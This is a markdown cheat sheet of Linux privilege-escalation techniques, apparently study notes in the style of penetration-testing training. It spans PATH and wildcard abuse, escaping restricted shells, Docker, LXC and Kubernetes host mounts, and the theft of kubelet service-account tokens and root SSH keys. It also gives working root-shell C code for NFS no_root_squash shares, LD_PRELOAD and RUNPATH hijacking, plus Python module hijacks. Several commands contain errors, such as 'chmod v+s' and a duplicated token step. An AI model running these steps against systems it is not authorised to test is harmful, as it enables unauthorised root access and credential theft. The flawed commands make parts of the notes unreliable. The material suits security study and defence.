# Linux privilege escalation

## Environment-based
### Path abuse
The contents of the PATH variable can be checked by using the commands ```env | grep PATH``` or ```echo $PATH```. 

Creating a script in a directory specified in the PATH will make it executable from any directory on the system. Adding ```.``` to a user's PATH adds their current working directory to a list. This can be exploited to run a malicious version of a binary (such as ```ls```) that is located in the current working directory rather than the actual binary in ```/bin```.

### Wildcard abuse
Wildcard characters can be used to replace other characters and are interpreted by the shell before other actions.

An example of how wildcards can be abused can be seen in the ```tar``` command, which has optional parameters. If files are created with the names of these parameters, they will be passed as command-line options when the wildcard is specified, which can be exploited to do things such as run a script that changes the contents of the ```/etc/sudoers``` file.

### Escaping restricted shells
__Command injection__  
Inject restricted commands into other commands that are allowed to be directly executed. For example, if only the ```ls``` command is allowed to be executed, other commmands such as ```pwd``` can be executed using the commad: ```ls -l `pwd` ```

__Command substitution__  
Use the shell's command substitution syntax to execute a command, for instance if a shell allows the execution of commands enclosed in backticks, this can be used to execute restricted commands.

__Command chaining__  
If allowed by the shell, multiple commands that are separated by shell metacharacters such as semicolons or vertical bars can be executed in a single line, as long as at least one of the commands is not restricted by the shell.

__Environment variables__  
Modify or create environment variables that the shell uses to execute commands that are not restricted. For instance, if the shell uses an environment variable to specify the directory in which commands are execited, the value of that variable can be changed to a differnt directory in order to execute a previously   restricted command.

__Shell functions__
If the shell allows users to define and call shell functions, these functions can be used to execute commands restricted by the shell.


## Permissions-based
### Special permissions
Execute specific programs or scripts that have the SETUID or SETGID bit set with the permissions of another user such as root.

### Sudo rights abuse
Check which sudo privileges a user has by running ```sudo -l```. These commands can be run in an unintended way to escalate privileges.

### Privileged groups
Check group membership using the ```id``` command.

__LXC/LCD__  
Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and mounting the host file system.

__Docker__  
Membership of this group can be used to escalete privileges by creating a docker container and mounting the file system to it with the command ```docker run -v /root:/mnt -it ubuntu```. 

__Disk__  
Membership of this group gives full access to any devices contained within ```/dev```, such as ```/dev/sda1```. With these privileges, an attacker can use the ```debugfs``` command to access the entire file system with root level privileges.

__ADM__  
Membership of this group allows read access to all the logs stored in ```/var/log```, which can be used to gather sensitive information.

### Capabilities
Capabilities are a feature that allow specific privileges to be granted to processes to allow them to perform specific actions that would otherwise be restricted. Processes that are not adequately isolated from other processes, or processses that are given more capabilities than necessary, can be used to escalate privileges. For a particular executable, capabilities can be set using the ```setcap``` command, and displayed using the ```getcap``` command.

__Capability values:__
- ```=```: This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.
- ```+ep```: This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.
- ```+ei```: This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.
```+p```: This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.

__Capabilities that can be used to scalate to escalate a user's privileges to root:__
- ```cap_setuid```: Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
- ```cap_setgid```: Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
- ```cap_sys_admin```: This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
- ```cap_dac_override```: Allows bypassing of file read, write, and execute permission checks.

## Service-based
### Vulnerable services
Services running on the system may have flaws that can be used to escalate privileges. 

### Cron jobs
Cron jobs may have misconfigurations that can be used to escalate privileges. The ```pspy``` tool can be used to view running processes, including cron jobs and commands run by other users. 

### LXC
LXC containers can be used to escalate privileges by mounting the host file system to the container. In order to create LXC containers, the user must be a member of the ```lxc``` or ```lxd``` group.

1. Import the container as an image with the command: ```lxc image import <image> --alias <alias>```
2. Configure the image to disable all isolation features: ```lxc init <alias> privesc -c security.privileged=true```
3. Specify the root path for the container: ```lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true```
4. Start container: ```lxc start privesc```
5. Log into container: ```lxc exec privesc /bin/bash```
6. Access the host file system as root: ```ls -l /mnt/root```

### Docker
LXC containers can be used to escalate privileges by mounting the host file system to the container. In order to create Docker containers, the user must be a member of the ```docker``` group.

1. Create Docker container and map the host's root directory to the ```/hostsystem``` directory on the container: ```docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem <image>```
2. Get the ID of the created container: ```docker -H unix:///app/docker.sock ps```
3. Log in to the container: ```docker -H unix:///app/docker.sock exec -it <container ID> /bin/bash```

The Docker socket may also be writeable to users outside of the ```docker``` group, in which case the command ```docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash``` can be used to escalate privileges.

### Kubernetes
Kubernetes uses Role-Based Access Control (RBAC) for the purpose of authentication, and can be configured to permit anonymous access.

1. Extract pods: ```curl https://<IP>:10250/pods -k | jq .```  
2. Analyze pods: ```kubeletctl -i --server <IP> pods```   
3. Check available commands: ```kubeletctl -i --server <IP> scan rce```  
4. Execute commands: ```kubeletctl -i --server <IP> exec <command> -p nginx -c nginx```  
5. Extract tokens: ```kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token```  
6. Extract certificates: ```kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token```  
7. List privileges: ```kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list```  
8. Create a YAML file to be used for mounting the root filesystem from the host system: 
```
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
9. Create a new pod: ```kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yam```
10. Extract root user's SSH key: ```kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc```

### Logrotate
Logrotate is a tool used to archive or dispose of old logs. Its main configuration file can be found at ```/etc/logrotate.conf```, status file at ```/var/lib/logrotate.status```, and individual configuration files in the ```/etc/logrotate.d``` directory.

To be able to exploit Logrotate with the particular exploit _logrotten_, the user must have write permissions on the log files, Logrotate must run as a privileged user or rooot, and the version must be vulnerable (versions 3.8.6, 3.11.0, 3.15.0, 3.18.0).

### Passive traffic capture
If ```tcpdump``` is installed, unprivileged users may be able to capture network traffic.

### Weak NFS privileges
The Network File System (NFS) allows users to access shared files or directories over the network on Unix systems. Accessible mounts cna be listed with the commmand ```showmount -e <IP>```. If the ```no_root_squash``` option is set (can be checked with the command ```cat /etc/exports```), privilege escalation may be possible through the upload of a malicious scripts to the share with the SUID bit set.

1. Create a simple script ```shell.c```:
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
2. Compile to binary: ```gcc shell.c -o shell```
3. Mount directory locally: ```sudo mount -t nfs <IP>/tmp /mnt```
4. Copy binary to directory: ```cp shell /mnt```
4. Change permissions on the binary: ```chmod v+s /mnt/shell```
5. Execute binary and obtain root shell: ```./shell```

### Hijacking Tmux sessions
A tmux process set up with weak permissions and running as a privileged user can be hijacked to escalate privileges.]

1. Check for any running tmux processses: ```ps aux | grep tmux```
2. Confirm permissions: ```ls -la /shareds```
3. Attach to the tmux session: ```tmux -S /shareds```

## Linux internals-based
### Kernel exploits
Check the kernel and OS version using the command ```uname -a``` or ```cat /etc/lsb-release```, in order to determine if the kernel is vulnerable to any known exploits.

### Shared libraries
The ```LD_PRELOAD``` environmental variable is used to load a library before executing a binary, and may be used to escalate privileges if the user has sudo privileges.

1. Create the following library ```root.c```:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
2. Compile the library: ```gcc -fPIC -shared -o root.so root.c -nostartfiles```
3. Escalate privileges: ```sudo LD_PRELOAD=/tmp/root.so <binary>```

### Shared objects
View shared objects required by a binary: ```ldd <binary>```  
Inspect RUNPATH configuration: ```readelf -d <binary> | grep PATH```  
If the RUNPATH is misconfigured to allow the loading of libraries from a directory which is writeable by all users, a malicious library can be placed in that directory which will take precedence over other folders.

1. Copy an existing library to the directory.
2. Execute the binar to produce an error message that says which function is required by the binary.
3. Create a script ```src.c``` which includes this function: 
```
#include<stdio.h>
#include<stdlib.h>

void <function>() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
4. Compile the script into a shared object: ```gcc src.c -fPIC -shared -o <path to shared object>```

### Python libraries
__Wrong write permissions__  
One of the python modules used by a script may have write permissions set for all users by mistake, allowing it to be edited and manipulated so that commands can be inserted. If SUID/SGID permissions have been assigned to the Python script that imports this module, the malicious code will automatically be included.

Insert malicious code into the module function that is used by the script:
```
import os
os.system('/bin/bash')
```

__Library path__  
Check PYTHONPATH listing: ```python3 -c 'import sys; print("\n".join(sys.path))'```
Show the default installation location of a module: ```pip3 show <module>```

For this exploit, the module imported by the script must be located under one of the lower priority paths listed via the PYTHONPATH variable, and the user must have write permissions to one of the paths having a higher priority on the list.

__PYTHONPATH environment variable__  
Check if user has permission to set environment variables for the python binary: ```sudo -l```  
Change PYTHONPATH environment variable to include a particular directory containing a malicious module: ```sudo PYTHONPATH=<directory>```
